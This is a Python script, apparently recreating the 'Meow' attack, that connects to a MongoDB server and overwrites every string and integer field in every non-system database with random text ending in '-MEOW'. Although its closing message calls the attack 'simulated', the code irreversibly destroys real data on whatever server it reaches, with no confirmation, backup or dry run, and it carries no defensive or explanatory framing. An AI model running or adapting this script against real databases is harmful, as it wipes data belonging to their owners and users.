import random
import string
from pymongo import MongoClient
import logging

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

def random_alphanumeric():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=10))

try:
    client = MongoClient('mongodb://localhost:27017/', serverSelectionTimeoutMS=5000)
    client.admin.command('ping')  # Verify connection
    print("Successfully connected to MongoDB")
except Exception as e:
    print(f"Failed to connect to MongoDB: {e}")
    exit(1)

databases = client.list_database_names()
logger.info(f"Found {len(databases)} databases")

for db_name in databases:
    if db_name not in ('admin', 'local', 'config'):
        db = client[db_name]
        collections = db.list_collection_names()
        logger.info(f"Processing database '{db_name}' with {len(collections)} collections")

        for collection_name in collections:
            collection = db[collection_name]
            total_docs = collection.count_documents({})
            logger.info(f"Processing collection '{collection_name}' with {total_docs} documents")

            for doc in collection.find():
                updated_doc = {}
                for key, value in doc.items():
                    if isinstance(value, str):
                        random_chars = random_alphanumeric()
                        new_value = random_chars + '-MEOW'
                        updated_doc[key] = new_value
                    elif isinstance(value, int):
                        random_chars = random_alphanumeric()
                        new_value = random_chars + '-MEOW'
                        updated_doc[key] = new_value
                    else:
                        updated_doc[key] = value
                collection.update_one({'_id': doc['_id']}, {'$set': updated_doc})

print("Meow Attack simulated. You have been M30W-ed!")
cat_art = r"""
ᓚᘏᗢ
"""
print(cat_art)